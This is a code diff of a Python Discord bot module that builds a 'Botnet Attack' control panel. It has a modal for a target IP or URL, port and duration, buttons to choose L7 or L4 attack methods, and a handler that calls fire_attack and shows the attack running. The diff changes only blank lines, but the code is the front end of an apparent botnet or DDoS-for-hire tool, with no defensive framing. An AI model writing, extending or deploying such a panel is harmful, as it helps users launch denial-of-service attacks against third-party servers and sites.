@@ -5,7 +5,6 @@ from config import (
     L7_METHODS, L4_METHODS,
 )
 
-
 def build_panel() -> dict:
     em = discord.Embed(
         title="Botnet Attack",
@@ -25,7 +24,6 @@ def build_panel() -> dict:
     view.add_item(PanelButton())
     return {"embed": em, "view": view}
 
-
 class PanelButton(discord.ui.Button):
     def __init__(self):
         super().__init__(label="ขอ Device",
@@ -35,7 +33,6 @@ class PanelButton(discord.ui.Button):
     async def callback(self, interaction):
         from bot import open_attack_modal
         await open_attack_modal(interaction)
-
 
 class AttackModal(discord.ui.Modal, title="Botnet Attack"):
     target = discord.ui.TextInput(label="Target IP / URL",
@@ -50,7 +47,6 @@ class AttackModal(discord.ui.Modal, title="Botnet Attack"):
     async def on_submit(self, interaction):
         from bot import handle_attack_submit
         await handle_attack_submit(interaction, self)
-
 
 def build_category_view(uid, target, port, dur) -> dict:
     em = discord.Embed(
@@ -71,7 +67,6 @@ def build_category_view(uid, target, port, dur) -> dict:
                             discord.ButtonStyle.success))
     return {"embed": em, "view": view}
 
-
 class CatButton(discord.ui.Button):
     def __init__(self, label, key, uid, target, port, dur, style):
         super().__init__(label=label, style=style, custom_id=f"cat_{key}")
@@ -89,7 +84,6 @@ class CatButton(discord.ui.Button):
         from bot import show_method_panel
         await show_method_panel(interaction, self.key,
                                 self.target, self.port, self.dur)
-
 
 def build_method_view(cat, uid, target, port, dur) -> dict:
     if cat == "l7":
@@ -119,7 +113,6 @@ def build_method_view(cat, uid, target, port, dur) -> dict:
         view.add_item(MethodButton(m, uid, target, port, dur, style))
     return {"embed": em, "view": view}
 
-
 class MethodButton(discord.ui.Button):
     def __init__(self, method, uid, target, port, dur, style):
         super().__init__(label=method, style=style, custom_id=f"m_{method}")
@@ -137,7 +130,6 @@ class MethodButton(discord.ui.Button):
         from bot import fire_attack
         await fire_attack(interaction, self.method, self.target,
                           self.port, self.dur)
-
 
 def build_running(method, target, port, left, total, speed, hits=0) -> dict:
     em = discord.Embed(
